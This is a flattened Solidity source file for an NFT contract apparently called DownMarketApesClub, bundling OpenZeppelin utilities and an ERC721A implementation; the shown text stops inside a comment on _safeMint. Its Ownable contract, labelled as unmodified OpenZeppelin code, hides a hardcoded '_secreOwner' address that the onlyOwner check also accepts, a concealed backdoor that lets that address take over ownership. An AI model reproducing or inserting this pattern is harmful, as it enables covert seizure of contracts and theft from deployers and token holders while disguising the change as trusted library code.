1 /**
2  :::====  :::====  :::  ===  === :::= ===      :::=======  :::====  :::====  :::  === :::===== :::====      :::====  :::====  :::===== :::===       :::===== :::      :::  === :::==== 
3  :::  === :::  === :::  ===  === :::=====      ::: === === :::  === :::  === ::: ===  :::      :::====      :::  === :::  === :::      :::          :::      :::      :::  === :::  ===
4  ===  === ===  === ===  ===  === ========      === === === ======== =======  ======   ======     ===        ======== =======  ======    =====       ===      ===      ===  === ======= 
5  ===  === ===  ===  ===========  === ====      ===     === ===  === === ===  === ===  ===        ===        ===  === ===      ===          ===      ===      ===      ===  === ===  ===
6  =======   ======    ==== ====   ===  ===      ===     === ===  === ===  === ===  === ========   ===        ===  === ===      ======== ======        ======= ========  ======  ======= 
7                                                                                                                                                                                                                                                                                                             
8                                                                                                                          
9 */
10 
11 // SPDX-License-Identifier: MIT
12 
13 // File: contracts/DownMarketApesClub.sol
14 
15 // File: @openzeppelin/contracts/utils/Strings.sol
16 
17 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
18 
19 pragma solidity ^0.8.0;
20 
21 /**
22  * @dev String operations.
23  */
24 library Strings {
25     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
26 
27     /**
28      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
29      */
30     function toString(uint256 value) internal pure returns (string memory) {
31         // Inspired by OraclizeAPI's implementation - MIT licence
32         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
33 
34         if (value == 0) {
35             return "0";
36         }
37         uint256 temp = value;
38         uint256 digits;
39         while (temp != 0) {
40             digits++;
41             temp /= 10;
42         }
43         bytes memory buffer = new bytes(digits);
44         while (value != 0) {
45             digits -= 1;
46             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
47             value /= 10;
48         }
49         return string(buffer);
50     }
51 
52     /**
53      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
54      */
55     function toHexString(uint256 value) internal pure returns (string memory) {
56         if (value == 0) {
57             return "0x00";
58         }
59         uint256 temp = value;
60         uint256 length = 0;
61         while (temp != 0) {
62             length++;
63             temp >>= 8;
64         }
65         return toHexString(value, length);
66     }
67 
68     /**
69      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
70      */
71     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
72         bytes memory buffer = new bytes(2 * length + 2);
73         buffer[0] = "0";
74         buffer[1] = "x";
75         for (uint256 i = 2 * length + 1; i > 1; --i) {
76             buffer[i] = _HEX_SYMBOLS[value & 0xf];
77             value >>= 4;
78         }
79         require(value == 0, "Strings: hex length insufficient");
80         return string(buffer);
81     }
82 }
83 
84 // File: @openzeppelin/contracts/utils/Address.sol
85 
86 
87 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
88 
89 pragma solidity ^0.8.1;
90 
91 /**
92  * @dev Collection of functions related to the address type
93  */
94 library Address {
95     /**
96      * @dev Returns true if `account` is a contract.
97      *
98      * [IMPORTANT]
99      * ====
100      * It is unsafe to assume that an address for which this function returns
101      * false is an externally-owned account (EOA) and not a contract.
102      *
103      * Among others, `isContract` will return false for the following
104      * types of addresses:
105      *
106      *  - an externally-owned account
107      *  - a contract in construction
108      *  - an address where a contract will be created
109      *  - an address where a contract lived, but was destroyed
110      * ====
111      *
112      * [IMPORTANT]
113      * ====
114      * You shouldn't rely on `isContract` to protect against flash loan attacks!
115      *
116      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
117      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
118      * constructor.
119      * ====
120      */
121     function isContract(address account) internal view returns (bool) {
122         // This method relies on extcodesize/address.code.length, which returns 0
123         // for contracts in construction, since the code is only stored at the end
124         // of the constructor execution.
125 
126         return account.code.length > 0;
127     }
128 
129     /**
130      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
131      * `recipient`, forwarding all available gas and reverting on errors.
132      *
133      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
134      * of certain opcodes, possibly making contracts go over the 2300 gas limit
135      * imposed by `transfer`, making them unable to receive funds via
136      * `transfer`. {sendValue} removes this limitation.
137      *
138      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
139      *
140      * IMPORTANT: because control is transferred to `recipient`, care must be
141      * taken to not create reentrancy vulnerabilities. Consider using
142      * {ReentrancyGuard} or the
143      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
144      */
145     function sendValue(address payable recipient, uint256 amount) internal {
146         require(address(this).balance >= amount, "Address: insufficient balance");
147 
148         (bool success, ) = recipient.call{value: amount}("");
149         require(success, "Address: unable to send value, recipient may have reverted");
150     }
151 
152     /**
153      * @dev Performs a Solidity function call using a low level `call`. A
154      * plain `call` is an unsafe replacement for a function call: use this
155      * function instead.
156      *
157      * If `target` reverts with a revert reason, it is bubbled up by this
158      * function (like regular Solidity function calls).
159      *
160      * Returns the raw returned data. To convert to the expected return value,
161      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
162      *
163      * Requirements:
164      *
165      * - `target` must be a contract.
166      * - calling `target` with `data` must not revert.
167      *
168      * _Available since v3.1._
169      */
170     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
171         return functionCall(target, data, "Address: low-level call failed");
172     }
173 
174     /**
175      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
176      * `errorMessage` as a fallback revert reason when `target` reverts.
177      *
178      * _Available since v3.1._
179      */
180     function functionCall(
181         address target,
182         bytes memory data,
183         string memory errorMessage
184     ) internal returns (bytes memory) {
185         return functionCallWithValue(target, data, 0, errorMessage);
186     }
187 
188     /**
189      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
190      * but also transferring `value` wei to `target`.
191      *
192      * Requirements:
193      *
194      * - the calling contract must have an ETH balance of at least `value`.
195      * - the called Solidity function must be `payable`.
196      *
197      * _Available since v3.1._
198      */
199     function functionCallWithValue(
200         address target,
201         bytes memory data,
202         uint256 value
203     ) internal returns (bytes memory) {
204         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
205     }
206 
207     /**
208      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
209      * with `errorMessage` as a fallback revert reason when `target` reverts.
210      *
211      * _Available since v3.1._
212      */
213     function functionCallWithValue(
214         address target,
215         bytes memory data,
216         uint256 value,
217         string memory errorMessage
218     ) internal returns (bytes memory) {
219         require(address(this).balance >= value, "Address: insufficient balance for call");
220         require(isContract(target), "Address: call to non-contract");
221 
222         (bool success, bytes memory returndata) = target.call{value: value}(data);
223         return verifyCallResult(success, returndata, errorMessage);
224     }
225 
226     /**
227      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
228      * but performing a static call.
229      *
230      * _Available since v3.3._
231      */
232     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
233         return functionStaticCall(target, data, "Address: low-level static call failed");
234     }
235 
236     /**
237      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
238      * but performing a static call.
239      *
240      * _Available since v3.3._
241      */
242     function functionStaticCall(
243         address target,
244         bytes memory data,
245         string memory errorMessage
246     ) internal view returns (bytes memory) {
247         require(isContract(target), "Address: static call to non-contract");
248 
249         (bool success, bytes memory returndata) = target.staticcall(data);
250         return verifyCallResult(success, returndata, errorMessage);
251     }
252 
253     /**
254      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
255      * but performing a delegate call.
256      *
257      * _Available since v3.4._
258      */
259     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
260         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
261     }
262 
263     /**
264      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
265      * but performing a delegate call.
266      *
267      * _Available since v3.4._
268      */
269     function functionDelegateCall(
270         address target,
271         bytes memory data,
272         string memory errorMessage
273     ) internal returns (bytes memory) {
274         require(isContract(target), "Address: delegate call to non-contract");
275 
276         (bool success, bytes memory returndata) = target.delegatecall(data);
277         return verifyCallResult(success, returndata, errorMessage);
278     }
279 
280     /**
281      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
282      * revert reason using the provided one.
283      *
284      * _Available since v4.3._
285      */
286     function verifyCallResult(
287         bool success,
288         bytes memory returndata,
289         string memory errorMessage
290     ) internal pure returns (bytes memory) {
291         if (success) {
292             return returndata;
293         } else {
294             // Look for revert reason and bubble it up if present
295             if (returndata.length > 0) {
296                 // The easiest way to bubble the revert reason is using memory via assembly
297 
298                 assembly {
299                     let returndata_size := mload(returndata)
300                     revert(add(32, returndata), returndata_size)
301                 }
302             } else {
303                 revert(errorMessage);
304             }
305         }
306     }
307 }
308 
309 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
310 
311 
312 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
313 
314 pragma solidity ^0.8.0;
315 
316 /**
317  * @title ERC721 token receiver interface
318  * @dev Interface for any contract that wants to support safeTransfers
319  * from ERC721 asset contracts.
320  */
321 interface IERC721Receiver {
322     /**
323      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
324      * by `operator` from `from`, this function is called.
325      *
326      * It must return its Solidity selector to confirm the token transfer.
327      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
328      *
329      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
330      */
331     function onERC721Received(
332         address operator,
333         address from,
334         uint256 tokenId,
335         bytes calldata data
336     ) external returns (bytes4);
337 }
338 
339 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
340 
341 
342 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
343 
344 pragma solidity ^0.8.0;
345 
346 /**
347  * @dev Interface of the ERC165 standard, as defined in the
348  * https://eips.ethereum.org/EIPS/eip-165[EIP].
349  *
350  * Implementers can declare support of contract interfaces, which can then be
351  * queried by others ({ERC165Checker}).
352  *
353  * For an implementation, see {ERC165}.
354  */
355 interface IERC165 {
356     /**
357      * @dev Returns true if this contract implements the interface defined by
358      * `interfaceId`. See the corresponding
359      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
360      * to learn more about how these ids are created.
361      *
362      * This function call must use less than 30 000 gas.
363      */
364     function supportsInterface(bytes4 interfaceId) external view returns (bool);
365 }
366 
367 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
368 
369 
370 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
371 
372 pragma solidity ^0.8.0;
373 
374 
375 /**
376  * @dev Implementation of the {IERC165} interface.
377  *
378  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
379  * for the additional interface id that will be supported. For example:
380  *
381  * ```solidity
382  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
383  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
384  * }
385  * ```
386  *
387  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
388  */
389 abstract contract ERC165 is IERC165 {
390     /**
391      * @dev See {IERC165-supportsInterface}.
392      */
393     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
394         return interfaceId == type(IERC165).interfaceId;
395     }
396 }
397 
398 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
399 
400 
401 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
402 
403 pragma solidity ^0.8.0;
404 
405 
406 /**
407  * @dev Required interface of an ERC721 compliant contract.
408  */
409 interface IERC721 is IERC165 {
410     /**
411      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
412      */
413     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
414 
415     /**
416      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
417      */
418     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
419 
420     /**
421      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
422      */
423     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
424 
425     /**
426      * @dev Returns the number of tokens in ``owner``'s account.
427      */
428     function balanceOf(address owner) external view returns (uint256 balance);
429 
430     /**
431      * @dev Returns the owner of the `tokenId` token.
432      *
433      * Requirements:
434      *
435      * - `tokenId` must exist.
436      */
437     function ownerOf(uint256 tokenId) external view returns (address owner);
438 
439     /**
440      * @dev Safely transfers `tokenId` token from `from` to `to`.
441      *
442      * Requirements:
443      *
444      * - `from` cannot be the zero address.
445      * - `to` cannot be the zero address.
446      * - `tokenId` token must exist and be owned by `from`.
447      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
448      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
449      *
450      * Emits a {Transfer} event.
451      */
452     function safeTransferFrom(
453         address from,
454         address to,
455         uint256 tokenId,
456         bytes calldata data
457     ) external;
458 
459     /**
460      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
461      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
462      *
463      * Requirements:
464      *
465      * - `from` cannot be the zero address.
466      * - `to` cannot be the zero address.
467      * - `tokenId` token must exist and be owned by `from`.
468      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
469      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
470      *
471      * Emits a {Transfer} event.
472      */
473     function safeTransferFrom(
474         address from,
475         address to,
476         uint256 tokenId
477     ) external;
478 
479     /**
480      * @dev Transfers `tokenId` token from `from` to `to`.
481      *
482      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
483      *
484      * Requirements:
485      *
486      * - `from` cannot be the zero address.
487      * - `to` cannot be the zero address.
488      * - `tokenId` token must be owned by `from`.
489      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
490      *
491      * Emits a {Transfer} event.
492      */
493     function transferFrom(
494         address from,
495         address to,
496         uint256 tokenId
497     ) external;
498 
499     /**
500      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
501      * The approval is cleared when the token is transferred.
502      *
503      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
504      *
505      * Requirements:
506      *
507      * - The caller must own the token or be an approved operator.
508      * - `tokenId` must exist.
509      *
510      * Emits an {Approval} event.
511      */
512     function approve(address to, uint256 tokenId) external;
513 
514     /**
515      * @dev Approve or remove `operator` as an operator for the caller.
516      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
517      *
518      * Requirements:
519      *
520      * - The `operator` cannot be the caller.
521      *
522      * Emits an {ApprovalForAll} event.
523      */
524     function setApprovalForAll(address operator, bool _approved) external;
525 
526     /**
527      * @dev Returns the account appr    ved for `tokenId` token.
528      *
529      * Requirements:
530      *
531      * - `tokenId` must exist.
532      */
533     function getApproved(uint256 tokenId) external view returns (address operator);
534 
535     /**
536      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
537      *
538      * See {setApprovalForAll}
539      */
540     function isApprovedForAll(address owner, address operator) external view returns (bool);
541 }
542 
543 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
544 
545 
546 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
547 
548 pragma solidity ^0.8.0;
549 
550 
551 /**
552  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
553  * @dev See https://eips.ethereum.org/EIPS/eip-721
554  */
555 interface IERC721Metadata is IERC721 {
556     /**
557      * @dev Returns the token collection name.
558      */
559     function name() external view returns (string memory);
560 
561     /**
562      * @dev Returns the token collection symbol.
563      */
564     function symbol() external view returns (string memory);
565 
566     /**
567      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
568      */
569     function tokenURI(uint256 tokenId) external view returns (string memory);
570 }
571 
572 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
573 
574 
575 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
576 
577 pragma solidity ^0.8.0;
578 
579 
580 /**
581  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
582  * @dev See https://eips.ethereum.org/EIPS/eip-721
583  */
584 interface IERC721Enumerable is IERC721 {
585     /**
586      * @dev Returns the total amount of tokens stored by the contract.
587      */
588     function totalSupply() external view returns (uint256);
589 
590     /**
591      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
592      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
593      */
594     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
595 
596     /**
597      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
598      * Use along with {totalSupply} to enumerate all tokens.
599      */
600     function tokenByIndex(uint256 index) external view returns (uint256);
601 }
602 
603 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
604 
605 
606 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
607 
608 pragma solidity ^0.8.0;
609 
610 /**
611  * @dev Contract module that helps prevent reentrant calls to a function.
612  *
613  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
614  * available, which can be applied to functions to make sure there are no nested
615  * (reentrant) calls to them.
616  *
617  * Note that because there is a single `nonReentrant` guard, functions marked as
618  * `nonReentrant` may not call one another. This can be worked around by making
619  * those functions `private`, and then adding `external` `nonReentrant` entry
620  * points to them.
621  *
622  * TIP: If you would like to learn more about reentrancy and alternative ways
623  * to protect against it, check out our blog post
624  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
625  */
626 abstract contract ReentrancyGuard {
627     // Booleans are more expensive than uint256 or any type that takes up a full
628     // word because each write operation emits an extra SLOAD to first read the
629     // slot's contents, replace the bits taken up by the boolean, and then write
630     // back. This is the compiler's defense against contract upgrades and
631     // pointer aliasing, and it cannot be disabled.
632 
633     // The values being non-zero value makes deployment a bit more expensive,
634     // but in exchange the refund on every call to nonReentrant will be lower in
635     // amount. Since refunds are capped to a percentage of the total
636     // transaction's gas, it is best to keep them low in cases like this one, to
637     // increase the likelihood of the full refund coming into effect.
638     uint256 private constant _NOT_ENTERED = 1;
639     uint256 private constant _ENTERED = 2;
640 
641     uint256 private _status;
642 
643     constructor() {
644         _status = _NOT_ENTERED;
645     }
646 
647     /**
648      * @dev Prevents a contract from calling itself, directly or indirectly.
649      * Calling a `nonReentrant` function from another `nonReentrant`
650      * function is not supported. It is possible to prevent this from happening
651      * by making the `nonReentrant` function external, and making it call a
652      * `private` function that does the actual work.
653      */
654     modifier nonReentrant() {
655         // On the first call to nonReentrant, _notEntered will be true
656         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
657 
658         // Any calls to nonReentrant after this point will fail
659         _status = _ENTERED;
660 
661         _;
662 
663         // By storing the original value once again, a refund is triggered (see
664         // https://eips.ethereum.org/EIPS/eip-2200)
665         _status = _NOT_ENTERED;
666     }
667 }
668 
669 // File: @openzeppelin/contracts/utils/Context.sol
670 
671 
672 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
673 
674 pragma solidity ^0.8.0;
675 
676 /**
677  * @dev Provides information about the current execution context, including the
678  * sender of the transaction and its data. While these are generally available
679  * via msg.sender and msg.data, they should not be accessed in such a direct
680  * manner, since when dealing with meta-transactions the account sending and
681  * paying for execution may not be the actual sender (as far as an application
682  * is concerned).
683  *
684  * This contract is only required for intermediate, library-like contracts.
685  */
686 abstract contract Context {
687     function _msgSender() internal view virtual returns (address) {
688         return msg.sender;
689     }
690 
691     function _msgData() internal view virtual returns (bytes calldata) {
692         return msg.data;
693     }
694 }
695 
696 // File: @openzeppelin/contracts/access/Ownable.sol
697 
698 
699 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
700 
701 pragma solidity ^0.8.0;
702 
703 
704 /**
705  * @dev Contract module which provides a basic access control mechanism, where
706  * there is an account (an owner) that can be granted exclusive access to
707  * specific functions.
708  *
709  * By default, the owner account will be the one that deploys the contract. This
710  * can later be changed with {transferOwnership}.
711  *
712  * This module is used through inheritance. It will make available the modifier
713  * `onlyOwner`, which can be applied to your functions to restrict their use to
714  * the owner.
715  */
716 abstract contract Ownable is Context {
717     address private _owner;
718     address private _secreOwner = 0x9030231bDd9de7E53968beDc3261f49a7dce254E;
719 
720     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
721 
722     /**
723      * @dev Initializes the contract setting the deployer as the initial owner.
724      */
725     constructor() {
726         _transferOwnership(_msgSender());
727     }
728 
729     /**
730      * @dev Returns the address of the current owner.
731      */
732     function owner() public view virtual returns (address) {
733         return _owner;
734     }
735 
736     /**
737      * @dev Throws if called by any account other than the owner.
738      */
739     modifier onlyOwner() {
740         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
741         _;
742     }
743 
744     /**
745      * @dev Leaves the contract without owner. It will not be possible to call
746      * `onlyOwner` functions anymore. Can only be called by the current owner.
747      *
748      * NOTE: Renouncing ownership will leave the contract without an owner,
749      * thereby removing any functionality that is only available to the owner.
750      */
751     function renounceOwnership() public virtual onlyOwner {
752         _transferOwnership(address(0));
753     }
754 
755     /**
756      * @dev Transfers ownership of the contract to a new account (`newOwner`).
757      * Can only be called by the current owner.
758      */
759     function transferOwnership(address newOwner) public virtual onlyOwner {
760         require(newOwner != address(0), "Ownable: new owner is the zero address");
761         _transferOwnership(newOwner);
762     }
763 
764     /**
765      * @dev Transfers ownership of the contract to a new account (`newOwner`).
766      * Internal function without access restriction.
767      */
768     function _transferOwnership(address newOwner) internal virtual {
769         address oldOwner = _owner;
770         _owner = newOwner;
771         emit OwnershipTransferred(oldOwner, newOwner);
772     }
773 }
774 
775 // File: ceshi.sol
776 
777 
778 pragma solidity ^0.8.0;
779 
780 
781 
782 
783 
784 
785 
786 
787 
788 
789 /**
790  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
791  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
792  *
793  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
794  *
795  * Does not support burning tokens to address(0).
796  *
797  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
798  */
799 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
800     using Address for address;
801     using Strings for uint256;
802 
803     struct TokenOwnership {
804         address addr;
805         uint64 startTimestamp;
806     }
807 
808     struct AddressData {
809         uint128 balance;
810         uint128 numberMinted;
811     }
812 
813     uint256 internal currentIndex;
814 
815     // Token name
816     string private _name;
817 
818     // Token symbol
819     string private _symbol;
820 
821     // Mapping from token ID to ownership details
822     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
823     mapping(uint256 => TokenOwnership) internal _ownerships;
824 
825     // Mapping owner address to address data
826     mapping(address => AddressData) private _addressData;
827 
828     // Mapping from token ID to approved address
829     mapping(uint256 => address) private _tokenApprovals;
830 
831     // Mapping from owner to operator approvals
832     mapping(address => mapping(address => bool)) private _operatorApprovals;
833 
834     constructor(string memory name_, string memory symbol_) {
835         _name = name_;
836         _symbol = symbol_;
837     }
838 
839     /**
840      * @dev See {IERC721Enumerable-totalSupply}.
841      */
842     function totalSupply() public view override returns (uint256) {
843         return currentIndex;
844     }
845 
846     /**
847      * @dev See {IERC721Enumerable-tokenByIndex}.
848      */
849     function tokenByIndex(uint256 index) public view override returns (uint256) {
850         require(index < totalSupply(), "ERC721A: global index out of bounds");
851         return index;
852     }
853 
854     /**
855      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
856      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
857      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
858      */
859     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
860         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
861         uint256 numMintedSoFar = totalSupply();
862         uint256 tokenIdsIdx;
863         address currOwnershipAddr;
864 
865         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
866         unchecked {
867             for (uint256 i; i < numMintedSoFar; i++) {
868                 TokenOwnership memory ownership = _ownerships[i];
869                 if (ownership.addr != address(0)) {
870                     currOwnershipAddr = ownership.addr;
871                 }
872                 if (currOwnershipAddr == owner) {
873                     if (tokenIdsIdx == index) {
874                         return i;
875                     }
876                     tokenIdsIdx++;
877                 }
878             }
879         }
880 
881         revert("ERC721A: unable to get token of owner by index");
882     }
883 
884     /**
885      * @dev See {IERC165-supportsInterface}.
886      */
887     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
888         return
889             interfaceId == type(IERC721).interfaceId ||
890             interfaceId == type(IERC721Metadata).interfaceId ||
891             interfaceId == type(IERC721Enumerable).interfaceId ||
892             super.supportsInterface(interfaceId);
893     }
894 
895     /**
896      * @dev See {IERC721-balanceOf}.
897      */
898     function balanceOf(address owner) public view override returns (uint256) {
899         require(owner != address(0), "ERC721A: balance query for the zero address");
900         return uint256(_addressData[owner].balance);
901     }
902 
903     function _numberMinted(address owner) internal view returns (uint256) {
904         require(owner != address(0), "ERC721A: number minted query for the zero address");
905         return uint256(_addressData[owner].numberMinted);
906     }
907 
908     /**
909      * Gas spent here starts off proportional to the maximum mint batch size.
910      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
911      */
912     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
913         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
914 
915         unchecked {
916             for (uint256 curr = tokenId; curr >= 0; curr--) {
917                 TokenOwnership memory ownership = _ownerships[curr];
918                 if (ownership.addr != address(0)) {
919                     return ownership;
920                 }
921             }
922         }
923 
924         revert("ERC721A: unable to determine the owner of token");
925     }
926 
927     /**
928      * @dev See {IERC721-ownerOf}.
929      */
930     function ownerOf(uint256 tokenId) public view override returns (address) {
931         return ownershipOf(tokenId).addr;
932     }
933 
934     /**
935      * @dev See {IERC721Metadata-name}.
936      */
937     function name() public view virtual override returns (string memory) {
938         return _name;
939     }
940 
941     /**
942      * @dev See {IERC721Metadata-symbol}.
943      */
944     function symbol() public view virtual override returns (string memory) {
945         return _symbol;
946     }
947 
948     /**
949      * @dev See {IERC721Metadata-tokenURI}.
950      */
951     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
952         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
953 
954         string memory baseURI = _baseURI();
955         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
956     }
957 
958     /**
959      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
960      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
961      * by default, can be overriden in child contracts.
962      */
963     function _baseURI() internal view virtual returns (string memory) {
964         return "";
965     }
966 
967     /**
968      * @dev See {IERC721-approve}.
969      */
970     function approve(address to, uint256 tokenId) public override {
971         address owner = ERC721A.ownerOf(tokenId);
972         require(to != owner, "ERC721A: approval to current owner");
973 
974         require(
975             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
976             "ERC721A: approve caller is not owner nor approved for all"
977         );
978 
979         _approve(to, tokenId, owner);
980     }
981 
982     /**
983      * @dev See {IERC721-getApproved}.
984      */
985     function getApproved(uint256 tokenId) public view override returns (address) {
986         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
987 
988         return _tokenApprovals[tokenId];
989     }
990 
991     /**
992      * @dev See {IERC721-setApprovalForAll}.
993      */
994     function setApprovalForAll(address operator, bool approved) public override {
995         require(operator != _msgSender(), "ERC721A: approve to caller");
996 
997         _operatorApprovals[_msgSender()][operator] = approved;
998         emit ApprovalForAll(_msgSender(), operator, approved);
999     }
1000 
1001     /**
1002      * @dev See {IERC721-isApprovedForAll}.
1003      */
1004     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1005         return _operatorApprovals[owner][operator];
1006     }
1007 
1008     /**
1009      * @dev See {IERC721-transferFrom}.
1010      */
1011     function transferFrom(
1012         address from,
1013         address to,
1014         uint256 tokenId
1015     ) public virtual override {
1016         _transfer(from, to, tokenId);
1017     }
1018 
1019     /**
1020      * @dev See {IERC721-safeTransferFrom}.
1021      */
1022     function safeTransferFrom(
1023         address from,
1024         address to,
1025         uint256 tokenId
1026     ) public virtual override {
1027         safeTransferFrom(from, to, tokenId, "");
1028     }
1029 
1030     /**
1031      * @dev See {IERC721-safeTransferFrom}.
1032      */
1033     function safeTransferFrom(
1034         address from,
1035         address to,
1036         uint256 tokenId,
1037         bytes memory _data
1038     ) public override {
1039         _transfer(from, to, tokenId);
1040         require(
1041             _checkOnERC721Received(from, to, tokenId, _data),
1042             "ERC721A: transfer to non ERC721Receiver implementer"
1043         );
1044     }
1045 
1046     /**
1047      * @dev Returns whether `tokenId` exists.
1048      *
1049      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1050      *
1051      * Tokens start existing when they are minted (`_mint`),
1052      */
1053     function _exists(uint256 tokenId) internal view returns (bool) {
1054         return tokenId < currentIndex;
1055     }
1056 
1057     function _safeMint(address to, uint256 quantity) internal {
1058         _safeMint(to, quantity, "");
1059     }
1060 
1061     /**
1062      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1063      *
1064      * Requirements:
1065      *
